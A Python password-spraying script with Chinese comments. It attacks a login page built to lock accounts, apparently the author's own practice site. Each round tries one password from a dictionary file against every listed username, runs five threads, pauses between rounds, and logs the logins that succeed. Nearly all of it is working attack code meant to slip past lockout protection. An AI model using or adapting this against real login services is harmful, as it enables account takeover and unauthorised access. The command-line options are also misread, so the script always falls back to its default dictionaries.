import argparse
import requests

from ba_bypass_bruteforce import bruteforce, stop_brute, success_queue, dict_queue, success_username

from random import choice
from time import sleep


MAX_ROUND = 3  # 爆破的轮数
curr_round = 0  # 当前的轮数
sleep_time = 2  # 每一轮休眠的秒数


def login_limit_user():
    """
    登录函数
    """
    try:
        login_info = dict_queue.get(block=False)
    except Exception as e:
        print("[Error] {0}".format(repr(e)))
        return

    username = login_info[0]
    # 如果这个用户名已经被爆破出来密码，那么跳过这个用户名
    if username in success_username:
        return

    password = login_info[1]
    # 登录
    payload = {
        "username": username,
        "password": password,
    }
    print('开始尝试用户名：{},密码:{}'.format(username,password))

    # url = "http://127.0.0.1:8000/user/login-block-account/?referer=/"
    url = "http://ss.gentlecp.com:40000/user/login-block-account/?referer=/"
    r = requests.post(url, data=payload)

    # 判断是否登录成功
    if r.status_code == 200:
        msg = login_info

        success_str = "欢迎访问GentleCP的网站"
        if success_str in r.text:
            # 登录成功则把登录信息保存到success_queue
            success_queue.put(msg)
            # 把登录成功的用户名添加到 success_username中，之后可以跳过这个用户名的密码的爆破
            success_username.append(username)
            print("[INFO] success: ", msg)

        # 如果想要爆破出来一个密码就立刻停止爆破，那么此处调用函数stop_brute，反之则注释此处
        # stop_brute()


def get_dict(dict_user, dict_pass):
    """
    生成字典队列
    :return:
    """
    with open("dict/{}".format(dict_user)) as f:
        username = [line.strip() for line in f.readlines()]

    with open('dict/{}'.format(dict_pass)) as f:
        passwords = [line.strip() for line in f.readlines()]

    count = 0
    for u in username:
        # 每一轮都换下一个密码
        p = passwords[curr_round % len(passwords)]
        count += 1
        pair = (u, p)
        dict_queue.put(pair)
    print("字典生成完成，长度 {}".format(count))


def get_parse() -> dict:
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", "-u", help="用户名字典")
    parser.add_argument("--password", "-p", help="密码字典")
    dic = vars(parser.parse_args())
    return dic


def print_result():
    """
    打印爆破的结果
    """
    success = []
    while not success_queue.empty():
        success.append(success_queue.get())
    print("\n[INFO] 爆破结果: ", success)


if __name__ == "__main__":
    args = get_parse()
    dict_username = args.get('dict_username', "username.txt")
    dict_password = args.get('dict_password', "password.txt")

    for curr_round in range(0, MAX_ROUND):
        print("[INFO] 开始第{0}轮爆破".format(curr_round))
        get_dict(dict_username, dict_password)
        bruteforce(login_limit_user, thread_num=5)
        print("[INFO] Sleep.")
        sleep(2)

    print_result()
